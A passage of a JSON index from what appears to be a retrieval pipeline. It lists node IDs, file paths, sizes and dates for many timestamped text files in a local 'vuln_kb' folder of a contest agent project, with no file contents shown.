"D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_907322.txt", "file_name": "20250408_175705_907322.txt", "file_type": "text/plain", "file_size": 3009, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "13cc907c-74a3-4fc1-8a4c-24490254910d": {"node_ids": ["e06f32fa-c130-4197-91e7-086a8d7e31c7"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_938739.txt", "file_name": "20250408_175705_938739.txt", "file_type": "text/plain", "file_size": 3177, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "62371b0d-34fc-4266-9a71-71ba1dd09326": {"node_ids": ["69608c5c-f945-465d-bfd5-eb32bde90c4c", "4dff9c3c-60a5-4bbe-be59-301597f7f327"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_024120.txt", "file_name": "20250408_175708_024120.txt", "file_type": "text/plain", "file_size": 4089, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "a859e5e9-8eaf-4a5c-b325-8e83563b3126": {"node_ids": ["04c70715-9371-4611-b3c8-2358b78b52aa"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_071438.txt", "file_name": "20250408_175708_071438.txt", "file_type": "text/plain", "file_size": 2266, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "0612b6c0-3f76-4425-bbea-8928da2a906f": {"node_ids": ["8535adc3-044d-4220-89bd-6b718e0aa71c"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_102846.txt", "file_name": "20250408_175708_102846.txt", "file_type": "text/plain", "file_size": 2662, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "37f5dcfc-7cb9-45e2-acdb-7551e0e4ac64": {"node_ids": ["29b04c9b-5e82-4da2-8ac7-6792948fc9b8", "8bf15800-93b6-402d-8f7f-b20006704b7a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_149968.txt", "file_name": "20250408_175708_149968.txt", "file_type": "text/plain", "file_size": 4037, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "d198b9b6-6405-4299-8c9e-966e575abc01": {"node_ids": ["b649884d-1020-4150-8fe0-60e6c2d161cb"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_181365.txt", "file_name": "20250408_175708_181365.txt", "file_type": "text/plain", "file_size": 3415, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "ccd9a8a0-1bd6-49b5-871e-9a31e61dabbf": {"node_ids": ["f342f81c-1808-4e96-b65b-c14bd672a0ac"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_228658.txt", "file_name": "20250408_175708_228658.txt", "file_type": "text/plain", "file_size": 3487, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "d822a52e-52df-4b79-950a-27c3c5df989a": {"node_ids": ["06d87ce0-76ee-48a8-a291-2a8e5ee44ff4"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_323925.txt", "file_name": "20250408_175710_323925.txt", "file_type": "text/plain", "file_size": 1178, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "63db19e4-93f8-4ac9-88a7-d160c4962737": {"node_ids": ["c2ed619e-dd70-472a-b66f-7952ad164c59"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_372239.txt", "file_name": "20250408_175710_372239.txt", "file_type": "text/plain", "file_size": 1048, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "a83b156e-7852-47b7-8349-4f6acd5ebc78": {"node_ids": ["38695fc6-bc79-4993-beee-77e52f8890af"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_404463.txt", "file_name": "20250408_175710_404463.txt", "file_type": "text/plain", "file_size": 1647, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "5bd326b8-12b7-4556-8a39-ac4dfac6afc5": {"node_ids": ["3c588ecf-ebe2-4559-8729-3c32abb989d8"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_435889.txt", "file_name": "20250408_175710_435889.txt", "file_type": "text/plain", "file_size": 1352, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "93a3a32d-d3bc-4214-96f4-d68090eeae27": {"node_ids": ["103db1be-a449-4684-83d0-f7c29edb0f88", "d4a5bb6b-2990-4579-8f55-67df7bedd915"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_483335.txt", "file_name": "20250408_175710_483335.txt", "file_type": "text/plain", "file_size": 4958, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "625ed93f-3c5c-49fe-a7f9-12ba96660f06": {"node_ids": ["0f0cd648-11be-415a-9948-d9f2507c9d5c"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_515431.txt", "file_name": "20250408_175710_515431.txt", "file_type": "text/plain", "file_size": 1834, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "cbb689e6-69c3-4c32-9c9f-73c3c51c1fcf": {"node_ids": ["aa863a64-700c-4957-90f8-49447ec353bd", "2e2458ce-c4f2-4571-8703-27e2681e8f0e"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_617451.txt", "file_name": "20250408_175712_617451.txt", "file_type": "text/plain", "file_size": 4583, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "83672024-a890-4545-b120-740588085375": {"node_ids": ["ac9f3a6d-e2fa-45f5-8a2d-050b4dc83049"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_648702.txt", "file_name": "20250408_175712_648702.txt", "file_type": "text/plain", "file_size": 2025, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "f61f67f4-6fa9-4633-a331-1ce0bbe3bb48": {"node_ids": ["092606bd-e087-4cf3-bae6-f65b678c60c3"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_695869.txt", "file_name": "20250408_175712_695869.txt", "file_type": "text/plain", "file_size": 1228, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "503f42e7-7cfa-4732-b3f4-2d8add9a3581": {"node_ids": ["40d0823c-600b-4683-bcf9-4d07aee0bf78"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_727301.txt", "file_name": "20250408_175712_727301.txt", "file_type": "text/plain", "file_size": 2921, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "82fb0311-8900-45f3-858f-fb8fe32932d4": {"node_ids": ["d811b36f-f5ec-4e1c-89b8-46727e4f40e8"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_774594.txt", "file_name": "20250408_175712_774594.txt", "file_type": "text/plain", "file_size": 1807, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "5a2c0663-b2bc-4f50-b017-0dbbc82478a1": {"node_ids": ["fa4b85fe-c01a-41c0-97bb-3dc29a87f524"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_806225.txt", "file_name": "20250408_175712_806225.txt", "file_type": "text/plain", "file_size": 2876, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "a8aaacbb-9b9e-4d5b-9ecc-5e935a8a6cb5": {"node_ids": ["21c33561-85b3-4ef0-aca2-d690490d0004"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_904801.txt", "file_name": "20250408_175714_904801.txt", "file_type": "text/plain", "file_size": 1262, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "b5d66284-5809-4926-9c7d-c3f0f6275b03": {"node_ids": ["10d49434-a55b-4909-ad96-5604dc606a2f"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_936043.txt", "file_name": "20250408_175714_936043.txt", "file_type": "text/plain", "file_size": 969, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "2e1f6904-858a-482a-921e-3251f8c3c0a2": {"node_ids": ["60335f50-e455-4181-94b6-881857817346"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_999098.txt", "file_name": "20250408_175714_999098.txt", "file_type": "text/plain", "file_size": 2258, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "5555f464-dbed-4a52-aa0a-79a3f4a3dee0": {"node_ids": ["b780631a-a3e0-4618-b054-8ff7ef57def2"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_030528.txt", "file_name": "20250408_175715_030528.txt", "file_type": "text/plain", "file_size": 2067, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "973d3d5e-e131-4c51-b72e-614978dc958b": {"node_ids": ["ed5d4c2d-5e81-403f-91cc-dce49e7c993f"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_061981.txt", "file_name": "20250408_175715_061981.txt", "file_type": "text/plain", "file_size": 1928, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "ec5b012a-48ca-4a21-b22b-03483fd9d265": {"node_ids": ["e59ee73a-da68-46f9-817c-2365fb52b74c"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_093489.txt", "file_name": "20250408_175715_093489.txt", "file_type": "text/plain", "file_size": 885, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "fe136642-90cd-4683-b2ba-6bb03d9fe89c": {"node_ids": ["a00ae6dc-b0d5-4071-a179-80216ca4dca9"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_202124.txt", "file_name": "20250408_175717_202124.txt", "file_type": "text/plain", "file_size": 3608, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "3004466a-db38-476d-9d5b-4ee726a038a5": {"node_ids": ["31d5b344-d5a6-4ee8-895a-371a351bcb39"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_249721.txt", "file_name": "20250408_175717_249721.txt", "file_type": "text/plain", "file_size": 2283, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "bd400085-3ca5-4c45-9e82-bf7e70714bfb": {"node_ids": ["53f42d22-00a6-4c24-8deb-db4460aa98ba"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_297762.txt", "file_name": "20250408_175717_297762.txt", "file_type": "text/plain", "file_size": 1331, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "ff845f64-3bd1-459b-b866-fb62239cfe5e": {"node_ids": ["625573f9-780b-4e19-b060-9a222a7f8dc6"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_329027.txt", "file_name": "20250408_175717_329027.txt", "file_type": "text/plain", "file_size": 1286, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "af877349-d564-49f8-9987-efabe2d3866b": {"node_ids": ["7f8f5531-db58-44fb-aba1-877928b301a8"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_376030.txt", "file_name": "20250408_175717_376030.txt", "file_type": "text/plain", "file_size": 1949, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "6756cc79-1442-4d55-a76c-b847f8620d42": {"node_ids": ["79ae6501-f4b5-4e60-8170-c092bcd02a66"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_423436.txt", "file_name": "20250408_175717_423436.txt", "file_type": "text/plain", "file_size": 827, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "cc13b3fa-6fab-4857-b0f2-776ed395ab0e": {"node_ids": ["a51cfa4a-203a-49cc-8dbf-24f47af93d46"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_532246.txt", "file_name": "20250408_175719_532246.txt", "file_type": "text/plain", "file_size": 1716, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "232ff45f-7478-40d2-8f8c-6d05c493b2d5": {"node_ids": ["7c9dab0f-c58e-4f5c-8e42-4cf5ca0ba76a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_579339.txt", "file_name": "20250408_175719_579339.txt", "file_type": "text/plain", "file_size": 2094, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "2e36d5de-57f3-4191-b2b0-f727da160a54": {"node_ids": ["fdfe6a42-f7f6-4433-b640-db6c8471ae3e"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_610862.txt", "file_name": "20250408_175719_610862.txt", "file_type": "text/plain", "file_size": 2465, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "e6bbdfaa-2896-47f9-9a8d-443630303409": {"node_ids": ["0d10d235-5c10-4450-87e3-f73b235b6fb9"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_657985.txt", "file_name": "20250408_175719_657985.txt", "file_type": "text/plain", "file_size": 749, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "f57148e9-5935-4d0a-9aa3-7d80f7b2b56d": {"node_ids": ["e57f8230-e77c-44bd-8a4a-ca52dfdd70f5"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_689337.txt", "file_name": "20250408_175719_689337.txt", "file_type": "text/plain", "file_size": 1828, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "e5dc82c0-936a-459f-89be-eb1ea21641d2": {"node_ids": ["cc9e2759-cf9b-412e-8192-55fcbd060453"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_736495.txt", "file_name": "20250408_175719_736495.txt", "file_type": "text/plain", "file_size": 1646, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "8042764e-2608-4e52-8407-57d9588f9755": {"node_ids": ["f9159372-9387-46e6-88ad-ee5443c13532"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_832305.txt", "file_name": "20250408_175721_832305.txt", "file_type": "text/plain", "file_size": 1762, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "88a19300-fbfa-47a5-be03-0185045e4027": {"node_ids": ["04ac218c-69ad-475a-8127-24f78c17171f"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_879397.txt", "file_name": "20250408_175721_879397.txt", "file_type": "text/plain", "file_size": 3727, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "0e872210-53ae-4825-94de-0be0e4844acd": {"node_ids": ["56c04a76-9c00-4359-b436-9c97b7e0ebc4"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_910820.txt", "file_name": "20250408_175721_910820.txt", "file_type": "text/plain", "file_size": 845, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "d1eb596a-6e77-4161-8724-3485d090da77": {"node_ids": ["4ddd7ab1-b511-4d1e-b101-c62d1d172c21"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_942258.txt", "file_name": "20250408_175721_942258.txt", "file_type": "text/plain", "file_size": 2096, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "865f8cb9-30d4-4db9-ac4f-bbe597873f44": {"node_ids": ["baf3f938-5140-4ee5-bf1e-dd8dbd115be9"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_973714.txt", "file_name": "20250408_175721_973714.txt", "file_type": "text/plain", "file_size": 2692, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "d8d53b8e-6ac7-446e-8c21-72882030baa4": {"node_ids": ["1aea1570-9fca-4ba9-95b2-cec968c881b8"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175722_020976.txt", "file_name": "20250408_175722_020976.txt", "file_type": "text/plain", "file_size": 506, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "d3365039-0c8c-4abc-936c-41861e37317f": {"node_ids": ["b479c015-a3c0-45d8-9fba-5df260156e95"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_116621.txt", "file_name": "20250408_175724_116621.txt", "file_type": "text/plain", "file_size": 709, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "1b0df341-2e51-409d-9add-d67fad62a602": {"node_ids": ["ce5048a3-dcf0-40e7-8228-0bd3c9ee313b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_148155.txt", "file_name": "20250408_175724_148155.txt", "file_type": "text/plain", "file_size": 972, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "59472fd4-b251-4e36-ae6e-b7185ff88454": {"node_ids": ["ff23a2c6-9445-4bda-a37c-872ad5481724"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_195500.txt", "file_name": "20250408_175724_195500.txt", "file_type": "text/plain", "file_size": 1716, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "03d6c74a-702f-4265-91f0-8945e6619169": {"node_ids": ["7cc18795-0679-4c9a-9c56-dbc23d607be3", "0b547b31-8340-47bf-a86c-c8f3b8bdda6b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_226922.txt", "file_name": "20250408_175724_226922.txt", "file_type": "text/plain", "file_size": 4604, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "2b662e88-abfa-47a4-9143-6343ab6caba7": {"node_ids": ["26a4cf8b-a0b4-483a-8ec1-22cceff71638"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_258324.txt", "file_name": "20250408_175724_258324.txt", "file_type": "text/plain", "file_size": 2152, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "19c6cc07-bc14-4fb6-9803-1d2a633e738a": {"node_ids": ["4f1bc339-60e3-43b2-b670-896f4300d120"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_289844.txt", "file_name": "20250408_175724_289844.txt", "file_type": "text/plain", "file_size": 884, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "ddd8b97a-930f-459e-9a76-8e25e285a50f": {"node_ids": ["02510199-2642-4cef-b0c5-1f938775df5e"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_398236.txt", "file_name": "20250408_175726_398236.txt", "file_type": "text/plain", "file_size": 1909, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "d04f04b0-e1e3-4498-97e5-37ac1e283988": {"node_ids": ["12a72c23-2125-4568-86b7-abf3dfa6ff47"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_429657.txt", "file_name": "20250408_175726_429657.txt", "file_type": "text/plain", "file_size": 873, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "71bb8e6b-075e-497e-a7ea-fc859f5b9db6": {"node_ids": ["a1406aea-4a81-433e-b099-f909d9ad5c26"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_461077.txt", "file_name": "20250408_175726_461077.txt", "file_type": "text/plain", "file_size": 2550, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "5e2c8a10-e17a-4a8e-975d-bb1df73729c8": {"node_ids": ["8d805081-2b96-4e5e-b6cc-a47892605e09"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_492824.txt", "file_name": "20250408_175726_492824.txt", "file_type": "text/plain", "file_size": 2228, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "5f54a15d-120d-400f-9bac-b450145ed972": {"node_ids": ["939b7e32-f1e2-4a21-b4a8-00efc90cc73d"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_524834.txt", "file_name": "20250408_175726_524834.txt", "file_type": "text/plain", "file_size": 1376, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "2d396aa5-d28c-4dbf-98f5-8f56cfeeaf7a": {"node_ids": ["356e0730-240d-4860-b05b-58cff56edde6"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_571908.txt", "file_name": "20250408_175726_571908.txt", "file_type": "text/plain", "file_size": 1770, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "959d1046-d11d-437c-9841-c671ee0b9659": {"node_ids": ["3d66df1a-3eac-4029-910a-2d5822573976"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_661788.txt", "file_name": "20250408_175728_661788.txt", "file_type": "text/plain", "file_size": 2535, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "24553444-4cde-44cf-beb3-a76982a7ed90": {"node_ids": ["f4fa43b1-128e-4d9c-a420-fa30cf827c2c"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_701252.txt", "file_name": "20250408_175728_701252.txt", "file_type": "text/plain", "file_size": 1228, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "abd189f8-f5de-463e-9f7d-e4f63822aadc": {"node_ids": ["1cfd17a9-f3f4-43f0-aa06-a2a745b15692"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_764061.txt", "file_name": "20250408_175728_764061.txt", "file_type": "text/plain", "file_size": 1085, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "84c2e511-48ec-47ff-a7e5-23983f681b44": {"node_ids": ["90e80038-3d01-4118-afdc-70235972c8b2"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_795471.txt", "file_name": "20250408_175728_795471.txt", "file_type": "text/plain", "file_size": 1389, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "0b0db083-274a-4440-a644-5638d7ee1546": {"node_ids": ["31debb55-00cc-4e2c-ac76-07dbe168fcee"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_827011.txt", "file_name": "20250408_175728_827011.txt", "file_type": "text/plain", "file_size": 910, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "dcf784b6-b3b1-438e-b1ec-fb58eb4100c9": {"node_ids": ["17422496-80be-4c7a-9193-eedeada76529"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_874805.txt", "file_name": "20250408_175728_874805.txt", "file_type": "text/plain", "file_size": 2229, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "c6f96e53-d21f-4f8e-980c-0291e4e94bf5": {"node_ids": ["3b11a85b-a4be-4e96-8142-960782a52d9b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175730_979419.txt", "file_name": "20250408_175730_979419.txt", "file_type": "text/plain", "file_size": 1725, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "e6df4fc4-db7f-4ceb-a609-7c9f924d9212": {"node_ids": ["c5ceb470-30a7-4daf-9c40-96eac674818b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_011003.txt", "file_name": "20250408_175731_011003.txt", "file_type": "text/plain", "file_size": 1252, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "1759b7f5-441f-421f-a9fd-2ccffaa785f8": {"node_ids": ["57952a95-4738-4ef8-9899-eb254b72bc0e", "247db873-5d5f-43a0-91ed-1c19d69fa406"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_064402.txt", "file_name": "20250408_175731_064402.txt", "file_type": "text/plain", "file_size": 5287, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "cd9ff649-ec18-4ac9-9da4-274624c4b102": {"node_ids": ["7bdbf99f-5253-4c29-a20e-1bce6afc1b58"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_111570.txt", "file_name": "20250408_175731_111570.txt", "file_type": "text/plain", "file_size": 1796, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "08c308e0-65ba-4778-8805-e21ca60057f2": {"node_ids": ["1d0a4247-f580-43da-b9cf-48fb969df598"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_142983.txt", "file_name": "20250408_175731_142983.txt", "file_type": "text/plain", "file_size": 891, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "8b738493-b7b0-4073-8783-2c1ab2689ce9": {"node_ids": ["e05557b6-9643-43a0-bfd9-7ad2d423e3fe"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_191146.txt", "file_name": "20250408_175731_191146.txt", "file_type": "text/plain", "file_size": 1222, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "14202eba-f4bb-434a-886d-25619c626e97": {"node_ids": ["52036974-cad1-4c16-a9e3-b942122b4bf6", "8864d579-699a-43e1-9153-d4c86a9208c5"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_300028.txt", "file_name": "20250408_175733_300028.txt", "file_type": "text/plain", "file_size": 6036, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "f14c65c4-f4e2-4744-a7a8-99617dca79c8": {"node_ids": ["98b65ce1-d404-4410-b60d-f9700f85ac51"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_327774.txt", "file_name": "20250408_175733_327774.txt", "file_type": "text/plain", "file_size": 1471, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "c1dc16ca-dd74-462c-9b49-f30857a804fa": {"node_ids": ["155b9b18-88ea-4400-ae90-d380e037eda2"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_359392.txt", "file_name": "20250408_175733_359392.txt", "file_type": "text/plain", "file_size": 2224, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "072ecfae-aeb3-4841-b622-c8c6b0bcbfc7": {"node_ids": ["387d58a6-802f-42c3-8d0a-1678242c8b8b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_390728.txt", "file_name": "20250408_175733_390728.txt", "file_type": "text/plain", "file_size": 2966, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "057af806-ded4-4385-b535-eebd2b75b0dc": {"node_ids": ["40fb89f1-9306-4dda-b641-41d5e89e57ad"], "metadata": {"file_path": 